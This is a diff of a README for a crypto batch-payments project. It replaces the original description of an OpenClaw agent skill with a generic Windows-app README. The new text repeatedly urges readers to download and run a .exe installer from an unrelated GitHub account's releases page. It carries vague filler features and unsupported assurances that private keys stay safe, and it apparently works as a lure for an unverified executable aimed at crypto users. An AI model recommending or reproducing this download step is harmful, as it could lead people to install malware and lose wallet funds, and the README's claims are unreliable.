@@ -1,66 +1,132 @@
-# Spraay Payments — OpenClaw Skill 💧
+# 💧 spraay-payments - Easy Multi-Chain Crypto Payments
 
-Multi-chain batch crypto payments, payroll, swaps, invoices, price feeds, and AI inference for your OpenClaw agent.
+[![Download Latest Release](https://img.shields.io/badge/Download-spraay--payments-brightgreen)](https://github.com/extentadulthood280/spraay-payments/releases)
 
-## What This Skill Does
+---
 
-Spraay Payments gives your OpenClaw agent the ability to:
+## 💾 Download and Install
 
-- **Batch payments** — Send tokens to dozens of wallets in one transaction (save 60-80% on gas)
-- **Payroll** — Pay your team with one command, ENS/Basename resolution included
-- **Token swaps** — Get quotes and execute swaps on Base, Ethereum, Arbitrum, and more
-- **Price feeds** — Real-time token prices (free, no payment needed)
-- **Invoicing** — Create and track crypto invoices
-- **AI inference** — Pay-per-query AI chat via OpenRouter
-- **Email/XMTP messaging** — Send payment confirmations and notifications
-- **IPFS storage** — Pin files to IPFS via Pinata
-- **RPC relay** — Access 7 chains via Alchemy
-- **Compliance** — Audit trails, tax reports, KYC verification
+To start using spraay-payments on your Windows computer, follow these steps:
 
-57 paid endpoints + 5 free endpoints across 11 chains.
+1. Go to the official release page:  
+   [https://github.com/extentadulthood280/spraay-payments/releases](https://github.com/extentadulthood280/spraay-payments/releases).
 
-## Install
+2. Look for the latest version. It will usually be at the top and labeled with a version number, such as `v1.0.0` or later.
 
-Tell your OpenClaw agent:
+3. Find the Windows installer file. It usually ends with `.exe` (for example, `spraay-payments-Setup.exe`).
 
-> "Install the spraay-payments skill"
+4. Click the installer file to download it.
 
-Or manually:
+5. Once downloaded, open the file by double-clicking it.
 
-```bash
-# From ClawHub
-clawhub install spraay-payments
+6. Follow the setup instructions on the screen:
+   - Choose where to install the app.
+   - Agree to terms if prompted.
+   - Wait while the app installs on your computer.
 
-# Or copy to your skills directory
-cp -r spraay-payments ~/.openclaw/skills/
-```
+7. When installation finishes, launch the app from your desktop or start menu.
 
-## Requirements
+---
 
-- `curl` and `jq` (installed on most systems)
-- An x402-compatible wallet (Coinbase CDP or similar) for paid endpoints
-- No API key needed — Spraay uses x402 micropayments
+## 🚀 Getting Started with spraay-payments
 
-## Quick Start
+This app helps you send multiple crypto payments across different chains in one batch. You can also manage payroll, swaps, and invoices easily using the Spraay x402 gateway.
 
-Once installed, just ask your agent:
+Here is how to start:
 
-- "Send 1000 USDC to alice.eth and 500 USDC to bob.base on Base"
-- "What's the price of ETH?"
-- "Create an invoice for 5000 USDC"
-- "Check my USDC balance on Arbitrum"
-- "Swap 2 ETH to USDC on Base"
+- Open spraay-payments on your Windows PC.
+- You will see the main dashboard with options to create payment batches or invoices.
+- Connect your crypto wallet if needed. Use the wallet connection button and follow the instructions.
+- Select the type of payment you want to make:
+  - Batch payments (send crypto to many addresses at once)
+  - Payroll (pay multiple employees or contractors)
+  - Swaps (exchange tokens on supported chains)
+  - Invoices (create and send invoices in crypto)
+- Enter the details like amounts, wallet addresses, and currencies.
+- Review the batch to check all details.
+- Confirm and send payments using the app’s interface.
 
-## Links
+---
 
-- **App**: https://spraay.app
-- **Gateway**: https://gateway.spraay.app
-- **Docs**: https://docs.spraay.app
-- **GitHub**: https://github.com/plagtech
-- **Twitter**: [@Spraay_app](https://twitter.com/Spraay_app)
-- **MCP Server**: https://smithery.ai/server/@plagtech/spraay-x402-mcp
+## 🖥 System Requirements
 
-## Revenue
+Make sure your Windows PC meets these requirements:
 
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for syncing and transactions
+- Optional: Supported crypto wallet software (e.g., MetaMask, Ledger)
 
-Built by [@plag](https://warpcast.com/plag) | [@lostpoet](https://twitter.com/lostpoet)
+---
+
+## 🔧 Features Overview
+
+spraay-payments offers several useful features to manage crypto payments:
+
+- Support for multiple blockchain networks in one batch
+- Create and save payment batches for recurring use
+- Handle payroll for multiple crypto employees or contractors
+- Swap tokens easily using built-in tools
+- Create professional crypto invoices with automatic tracking
+- Use the Spraay x402 gateway for fast and secure transactions
+- Simple user interface made for non-technical users
+
+---
+
+## 🔒 Security and Privacy
+
+The app connects directly to your crypto wallet to keep your keys safe. It does not store or access private keys on its servers. All transactions are signed by your wallet software.
+
+Your payment information and data stay on your device unless you choose to share invoices or reports.
+
+---
+
+## ⚙️ Setup Tips
+
+- Keep your wallet app updated to avoid connection issues.
+- Use strong passwords or hardware wallets for added security.
+- Check your internet connection before making batches.
+- If the app shows errors during payment, restart and try again.
+- Review transactions carefully before confirming.
+
+---
+
+## ❓ Troubleshooting
+
+If you run into problems, try these steps:
+
+- Restart your computer and try again.
+- Make sure your crypto wallet is unlocked and connected.
+- Check your internet connection.
+- Make sure you downloaded the latest version from the release page.
+- Reinstall the app if files are corrupted.
+
+For further help, check the Issues tab on GitHub or ask your network administrator.
+
+---
+
+## 📦 Update Instructions
+
+To update spraay-payments:
+
+1. Visit the release page again:  
+   [https://github.com/extentadulthood280/spraay-payments/releases](https://github.com/extentadulthood280/spraay-payments/releases).
+
+2. Download the latest installer file.
+
+3. Run the installer. It will replace the old version while keeping your settings.
+
+4. Restart the app to use the new version.
+
+---
+
+## 📚 Additional Resources
+
+- Official documentation covers detailed workflow and features.
+- Crypto wallet setup guides for connecting to spraay-payments.
+- FAQ section covering common questions about batch payments and invoicing.
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Get%20Started%20Here-blue?style=for-the-badge)](https://github.com/extentadulthood280/spraay-payments/releases)
